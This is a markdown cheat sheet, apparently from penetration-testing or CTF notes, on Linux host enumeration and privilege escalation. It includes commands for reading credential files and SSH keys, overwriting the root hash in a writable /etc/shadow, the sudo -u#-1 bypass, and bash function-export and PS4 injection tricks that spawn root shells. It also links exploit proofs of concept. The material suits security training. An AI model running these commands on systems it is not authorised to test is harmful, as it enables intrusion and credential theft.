## Linux handy commands

<div class="row row-cols-md-2"><div>

Explore the host

* `bash`: start a bash shell
* `cd`: move to another folder
* `ls`: list files in a folder
* `pwd`: path to the current directory
* `cat`: print (usually small) files
* `less`: read (usually big) files
* `chmod`: change permissions
* `chown`: change owner
* `find`: find a file/folder
* `grep/egrep`: find something in a file
* `su`: change user
* `wget`: download something

> You may use python to do things for you, such as starting a web server to browse files <small>(`python3 -m  http.server`)</small>, or run commands <small>(`python -c 'import pty; pty.spawn("/bin/bash")'`)</small>.
</div><div>

Learn more about your environment

* `w`: who is logged in, and what they are doing
* `who`: who is logged in
* `echo $0`: language used by the current shell
* `whoami`: username
* `last`: list of last logged users
* `id`: username, group...
* `uname -a`: info about the machine
* `hostname`: info about the host
* `ps`: see running processes
* `env`: see environment variables
* `umask`: see the default perms on newly created files
* `getent`: shortcut to get entries about something, such as `passwd`
* `finger`: return a summary of information about a user
</div></div>

## Linux environment

<div class="row row-cols-md-2 mt-3"><div>

**Learn more about your computer** üó∫Ô∏è

* `/proc/version`: information about the machine
* `/etc/*release`: information about the operating system
* `/etc/issue`: alternative to find the OS/version

**Look for (sensitive?) information** üîë

* `/etc/passwd`: usernames, their groups, their home, and their shell
* `/etc/shadow` <small>(root)</small>: username, and their hashed password
* `/etc/group` or `groups`: see groups
* `/etc/gshadow` <small>(root)</small>: groups hashed passwords (if any)
* `/etc/sudoers` <small>(root)</small>: sudoers, and rules applied to them, if any
* `ls -ahl /root/`: see if there are readable files in root's home
* `ls /`: look for unexpected folders in `/`
* `find / -name *id_dsa* 2> /dev/null`: RSA credentials
  * You can use `ssh -i key` to connect using a key
  * The key must have the permissions `u+rw` at least
  * You can try to crack it

<br>

**There may be useful things in logs** üîé 

* Check browser history + saved credentials
* `~/.bash_history`: there may be something useful in the bash_history
  * Look for calls to sudo
  * Look for calls to services (mysql...)
* Look for backups <small>(such as emails/conversations/database)</small>
* Look for mails `/var/mail/`
* `/var/log/` (folder): log files
  * Look for firewall logs (`/var/log/syslog`)
  * Look for apache/... logs
  * Look for fail2ban logs
  * Look for ssh logs (`/var/log/auth.log`)
</div><div>

**Cron tasks** ‚≠ê

Cron are the name given to automated tasks on Linux. See `crontab -l` for the tasks of the current user, and `ls -la /etc/cron*` for every cron tasks. Then, you may look for vulnerable cron tasks, meaning tasks using

* files that you can edit, 
* environment variables using paths/... that you can edit,
* glob-patterns that you may inject, for instance, if a command runs on a directory in which you can create files, you can create files named after the injectable command line flags.

<br>

**Potentially vulnerable services** üí∏

* Apache: `apache2 -v` / `apache2ctl -M` / `httpd -v`
* Sudo: `sudo -V`
* PostgresSQL: `psql -V`
* MySQL: `mysql --version`
* NFS: see if there are shares, and if root_squashing is enabled

Once you found a service, look for CVE for the given version, and try to use one to escalate to root.

<br>

**Other files that may be useful** üö™

* `/etc/services`: see ports and the services running on it
* `/etc/profile`: set environment variables...

</div></div>

> **NOTE**: don't forget to redirect any errors with `some_command 2> /dev/null`.

## Linux privilege enumeration

<div class="row row-cols-md-2"><div>

Privilege escalation refer to a process of obtaining super-administrator (a.k.a. root) privileges, starting from a non-root user.

* Find misconfiguration <small>(sudo, system files, NFS...)</small>
* Find a vulnerable service and exploit it <small>(apache, mysql...)</small>
* Find processes/tasks/script in which you can inject data
  * cron jobs
  * script/.so/... with the SUID bit
  * ...
* Find if you can exploit the kernel
* ...

See guides

Find vulnerabilities in binaries.

* [gtfobins](https://gtfobins.github.io/) (7.4k ‚≠ê): a reference to find ways to exploit a command with misconfigured permissions.
* [gtfo](https://github.com/t0thkr1s/gtfo) (96 ‚≠ê): a python script to browse locally, a most-likely, outdated, version of gtfobins.

There are many scripts **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...

* [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) (10.4k ‚≠ê): a script shell
* [LinEnum](https://github.com/rebootuser/LinEnum) (5.4k ‚≠ê): a script shell

* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (lse, 2.5k ‚≠ê): a script shell
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (1.1k ‚≠ê): a python script

Random stuff that may be useful

## Misconfigured permissions

<div class="row row-cols-md-2"><div>

If `/etc/shadow` was "intentionally" misconfigured

```bash
$ cat /etc/shadow
# if you can read it: try to bruteforce the password
# if you can write it: change the root password
# (copy a password / generate one mkpasswd -m sha-512 toto)
```

Until 1979/Unix V7, passwords were stored in `/etc/passwd`, so a regular user could read them, and try brute-forcing the password.

```bash
$ cat /etc/shadow
- root:x:...
+ root:hashed_password:...
# openssl passwd toto
```
</div><div>

**SUID/GUID**

Scripts having the SUID bit can be executed with the permissions of their owner. GUID is the same, but using the owner group permissions. If you find one, try to see on GTFOBins if you have a well-known way to exploit it.

```bash
$ find / -perm -u=s -type f 2>/dev/null
$ find / -perm -g=s -type f 2>/dev/null
```

If the script "hand-made", or not something on GTFOBins, then you can use `strace script`, and `strings script`. Both commands can be used if the script is "unreadable", to try to find what the script is doing, and maybe find Paths/Environment variables that you may have the permission to edit.

> **CVE-2021-4034**: `/usr/bin/pkexec` a file installed by default on
every major Linux distribution with a SUID bit could be exploited to get root. See [arthepsy PoC](https://github.com/arthepsy/CVE-2021-4034) (913 ‚≠ê), or [berdav PoC](https://github.com/berdav/CVE-2021-4034) (1.7k ‚≠ê).

## Exploit sudo

*A good reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)* (1.6k ‚≠ê).

<div class="row row-cols-md-2"><div>

Try to find commands that can be run with sudo

```bash
$ sudo -l
# if asking a password, abort
# otherwise, 
# - look for the command on GTFOBins
# - look for environment variable loaded that may be exploited
$ sudo -n nc # if nc allowed
```
</div><div>

**sudo before 1.8.28 (CVE-2019-14287)**: if a user was allowed to run one specific command using sudo, such as `nc`, then it was possible for any user to bypass the check, and run the command as root.

```bash
$ sudo -u#-1 nc
$ sudo -u#4294967295 nc
```
</div></div>

<hr class="sep-both">

## Exploit bash

<div class="row row-cols-md-2"><div>

**Bash versions <4.2-048**: it is possible to create functions named after a path, which allow us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.

```bash
function /some/path { /bin/bash -p; }
export -f /some/path
```
</div><div>

**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.

```bash
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
```
</div></div>

<hr class="sep-both">

## Kernel exploits

<div class="row row-cols-md-2"><div>

Kernel exploits should be used at a last resort, as they will most probably severely impact the machine state.

* [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW) on Linux kernel <4.8.3
</div><div>

There are two OLD scripts, for OLD Linux Kernels, if needed

* [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) (3.9k ‚≠ê): still updated with new exploits
* [Linux_Exploit_Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester) (1.6k ‚≠ê): up to 4.x excluded
* [Linux Kernel Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) (1.4k ‚≠ê): up to 5.x excluded
